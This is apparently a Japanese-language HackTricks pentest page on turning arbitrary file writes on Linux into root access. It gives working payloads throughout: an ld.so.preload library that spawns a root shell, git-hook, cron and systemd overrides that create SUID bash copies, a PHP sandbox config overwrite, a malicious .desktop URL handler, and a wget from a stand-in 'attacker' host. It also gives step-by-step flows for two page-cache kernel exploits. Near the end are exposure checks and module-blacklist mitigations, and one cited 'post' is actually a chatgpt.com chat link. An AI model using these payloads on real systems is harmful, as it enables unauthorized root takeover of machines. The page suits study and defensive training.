# Rootへの任意ファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

このファイルは **`LD_PRELOAD`** 環境変数と同様に動作しますが、**SUID binaries** でも機能します。\
このファイルを作成または変更できる場合、実行される各 binary とともに**ロードされる library のパス**を追加するだけで済みます。

例: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) は、git repository 内で commit が作成されたときや merge など、さまざまな **events** で **実行される** **scripts** です。そのため、**privileged script または user** がこれらの操作を頻繁に実行しており、**`.git` folder に書き込み可能**であれば、これを **privesc** に利用できます。

例えば、git repo の **`.git/hooks`** に **script を生成**して、新しい commit が作成されたときに常に実行されるようにできます。
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Timeファイル

rootが実行する**cron関連ファイルに書き込める**場合、通常は次回ジョブ実行時にコード実行を取得できます。興味深い対象には以下があります。

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/` または `/var/spool/cron/crontabs/` にあるroot自身のcrontab
- `systemd` timersおよびそれらが起動するservices

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的な悪用経路:

- `/etc/crontab` または `/etc/cron.d/` 内のファイルに **新しい root cron job を追加する**
- `run-parts` によってすでに実行されている **スクリプトを置き換える**
- **既存の timer target にバックドアを仕掛ける**（起動されるスクリプトまたはバイナリを変更する）

最小限の cron payload の例:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts` が使用する cron ディレクトリ内にしか書き込めない場合は、代わりにそこへ実行可能ファイルを配置します:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
注記:

- `run-parts` は通常、ドットを含むファイル名を無視するため、`backup.sh` ではなく `backup` のような名前を使用します。
- 一部の distro では、従来の cron の代わりに `anacron` または `systemd` timers を使用しますが、abuse の考え方は同じです: **後で root が実行する内容を変更する**。

### Service & Socket files

**`systemd` unit files** またはそれらから参照されるファイルに書き込める場合、unit を reload および restart するか、service/socket activation の処理が trigger されるのを待つことで、root として code execution を取得できる可能性があります。

興味深い target には、次のものがあります:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` にある Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` から参照される Service scripts/binaries
- root service によって読み込まれる、書き込み可能な `EnvironmentFile=` paths

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
一般的な悪用経路:

- **`ExecStart=` を上書きする**: 変更可能な root-owned service unit 内で行う
- **drop-in override を追加する**: まず古い `ExecStart=` をクリアしてから、悪意のある `ExecStart=` を設定する
- **unit がすでに参照している script/binary に backdoor を仕込む**
- **socket-activated service を hijack する**: socket が接続を受信したときに起動する、対応する `.service` ファイルを変更する

悪意のある override の例:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的なactivationフロー:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
自分で service を restart できなくても、socket-activated unit を編集できる場合は、root として backdoored service の実行をトリガーするために、**client connection を待つだけ**でよいことがあります。

### 特権 PHP sandbox で使用される制限付き `php.ini` を上書きする

一部のカスタム daemon は、**制限付きの `php.ini`**（例: `disable_functions=exec,system,...`）を指定して `php` を実行することで、ユーザーが提供した PHP を検証します。sandbox 内の code に `file_put_contents` のような**任意の write primitive**があり、daemon が使用する**正確な `php.ini` path**にアクセスできる場合、その config を**上書き**して制限を解除し、その後、昇格された権限で実行される 2 つ目の payload を送信できます。

典型的な flow:

1. 最初の payload で sandbox config を上書きする。
2. 危険な functions が再び有効になった状態で、2 つ目の payload が code を実行する。

最小限の例（daemon が使用する path に置き換える）:
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
daemon が root として実行される場合（または root 所有のパスを使って検証する場合）、2 回目の実行では root コンテキストが得られます。これは、sandboxed runtime がファイルを書き込める場合における、基本的な **config overwrite による privilege escalation** です。

### binfmt_misc

`/proc/sys/fs/binfmt_misc` にあるファイルは、どの種類のファイルをどのバイナリで実行するかを示します。TODO: 一般的なファイル形式を開いたときに rev shell を実行するために、これを悪用する要件を確認する。

### Overwrite schema handlers (like http: or https:)

被害者の configuration directories への書き込み権限を持つ attacker は、system behavior を変更するファイルを簡単に置き換えたり作成したりでき、意図しない code execution を引き起こせます。`$HOME/.config/mimeapps.list` ファイルを変更して、HTTP および HTTPS URL handlers を malicious file（例: `x-scheme-handler/http=evil.desktop` を設定）に向けることで、attacker は **任意の http または https link をクリックすると、その `evil.desktop` ファイルに指定された code が実行される** ようにできます。たとえば、`$HOME/.local/share/applications` 内の `evil.desktop` に次の malicious code を配置すると、外部 URL をクリックするたびに埋め込まれた command が実行されます。
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
詳しい情報については、実際の脆弱性の exploit に使用された[**この投稿**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49)を確認してください。

### Root が user-writable な scripts/binaries を実行する場合

特権ワークフローが `/bin/sh /home/username/.../script` のようなもの（または unprivileged user が所有するディレクトリ内のバイナリ）を実行する場合、それを hijack できます。

- **実行を検出する:** [pspy](https://github.com/DominicBreuker/pspy) でプロセスを監視し、root が user-controlled なパスを invoke するタイミングを捕捉します。
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **書き込み可能性を確認:** 対象ファイルとそのディレクトリの両方が、自分のユーザーによって所有されているか、書き込み可能であることを確認する。
- **対象をHijack:** 元のバイナリ/スクリプトをバックアップし、SUID shellを作成する（またはその他のrootアクションを実行する）payloadを配置してから、権限を復元する:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged action をトリガーする**（例：helper を spawn する UI button を押す）。root が hijacked path を再実行したら、`./rootshell -p` で escalated shell を取得する。

### privileged binary の page-cache-only file modification

一部の kernel bug は、file **on disk** を変更しない。代わりに、readable file の **page cache copy** のみを変更できる。**setuid** またはその他の方法で **root-executed** される binary を対象にできる場合、次回の execution で memory 上の attacker-controlled bytes が実行され、disk 上の file hash が変更されていないにもかかわらず privileges を escalate できる。

これは、**runtime-only file write primitive** として考えると有用である。

- **Disk stays clean**：inode と disk 上の bytes は変更されない
- **Memory is dirty**：cached page を read/execute する processes は attacker-modified content を取得する
- **Effect is temporary**：reboot または cache eviction 後に変更は消える

この primitive は、classic **arbitrary file write** と、Dirty COW / Dirty Pipe などの古い **page-cache abuse** bug の中間に位置する。

- Dirty COW は race に依存していた
- Dirty Pipe には write-position constraints があった
- vulnerable path が cached file-backed pages へ direct writes を提供する場合、page-cache-only primitive の方が信頼性が高い可能性がある

#### Generic privesc flow

1. **file-backed page cache pages** に書き込める kernel primitive を取得する
2. **readable privileged binary** または別の root-executed file に対して使用する
3. page が cache から evict される **前に** execution をトリガーする
4. on-disk file が未変更に見える状態で、root として code execution を取得する

Typical high-value targets：

- **setuid-root** binaries
- **root services** によって起動される Helpers
- **host kernel/page cache** を共有する **containers** から頻繁に実行される Binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) は、この class の良い example である。vulnerable path は Linux crypto userspace API（`AF_ALG` / `algif_aead`）内にあった。

- `splice()` は、readable file の page-cache pages への references を crypto TX scatterlist へ移動できる
- in-place の `algif_aead` decrypt path は、source と destination buffers を再利用した
- `authencesn` はその後、destination tag region に書き込んだ
- その region がまだ spliced file-backed pages を参照していた場合、write は **target file の page cache** に到達した

したがって、重要な technique は CVE 自体ではなく、次の pattern である。

- **file-backed cache pages を kernel subsystem に feed する**
- subsystem にそれらを **writable output として扱わせる**
- memory 内で小さく制御された overwrite をトリガーする

public PoC は、memory 内の `/usr/bin/su` を patch するために、繰り返し **4-byte writes** を実行し、その後これを execute した。

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) は、同じ **page-cache-only write-to-root** pattern の別 variant を示している。ただし今回は、sink は `AF_ALG` ではなく **IPsec ESP decrypt** である。

重要な technique は **metadata-laundering step** である。

- `splice()` は **read-only file-backed page-cache page** を ESP-in-UDP packet に配置する
- 元の DirtyFrag mitigation は、その skb に `SKBFL_SHARED_FRAG` を tag し、`esp_input()` が decrypt 前に **copy** するようにしていた
- netfilter `TEE` は `nf_dup_ipv4()` -> `__pskb_copy_fclone()` を通じて packet を duplicate する
- clone は同じ **physical page-cache reference** を保持するが、`SKBFL_SHARED_FRAG` を失う
- その後、`esp_input()` は clone を安全なものとして扱い、file-backed page 上で **in-place `cbc(aes)` decrypt** を実行する

したがって、reviewer にとっての lesson は CVE より広い。operation が最初に copy すべきかどうかを判断するために **skb/page metadata** に依存する mitigation では、**backing page を保持したまま metadata を削除する clone/copy path** によって、write primitive が気付かないうちに再び有効化される可能性がある。

Typical exploitation flow：

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` を実行し、private network namespace 内で **`CAP_NET_ADMIN`** を取得する
2. loopback を up にし、`mangle/OUTPUT` に netfilter `TEE` rule を install する
3. `NETLINK_XFRM` 経由で **XFRM ESP transport SAs** を install する
4. 各 target 4-byte word を SA の `seq_hi` field に encode する（DirtyFrag の word-selection trick）
5. spliced ESP-in-UDP packet を send し、**TEE clone** が `esp_input()` に到達して **in place** で decrypt されるようにする
6. page-cache copy of `/usr/bin/su` または別の privileged executable に attacker-controlled code が含まれるまで repeat する

Operationally、impact は `AF_ALG` example と同じである。disk 上の file は clean なままだが、`execve()` は **mutated page-cache bytes** を消費し、root を取得できる。

この variant に有用な exposure checks：
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
ここでの短期的な attack-surface reduction も path-specific です。`48f6a5356a33` を含む kernel にアップグレードすると clone path が修正され、`xt_TEE` の autoload をブロックすると **flag-laundering step** が除去され、`esp4` / `esp6` をブロックすると **decrypt sink** が除去されます。

#### Exposure と hunting

この種類のバグを疑っている場合、ディスクの整合性チェックだけに頼らないでください。次の項目も確認します。
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` は module として loadable/unloadable になる
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface は kernel に組み込まれる
- setuid binaries は有力な target。page-cache-only patch だけで local foothold を root に変えられる場合がある

#### `algif_aead` path の attack-surface reduction

vulnerable interface が loadable module によって提供されている場合:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
カーネルに組み込まれている場合、以下のように init path をブロックすると報告された情報漏えいもあります：
```bash
initcall_blacklist=algif_aead_init
```
この種のmitigationは、他のkernel LPEについても覚えておく価値があります。exploitが特定のoptional interfaceに依存している場合、そのinterfaceを無効化またはblacklistすることで、kernel全体をupgradeできるようになる前でもexploit pathを遮断できます。

## 参照

- [HTB Bamboo – user-writableなPaperCut directory内のroot実行scriptをhijackする](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [CVE-2026-31431に関するOpenwall oss-securityのdisclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - out-of-placeで動作するようrevert](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503)の解析とexploit](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: `__pskb_copy_fclone()`で`SKBFL_SHARED_FRAG`を保持 (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Linux earlier mitigation: spliced UDP packetsに`SKBFL_SHARED_FRAG`を設定 (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
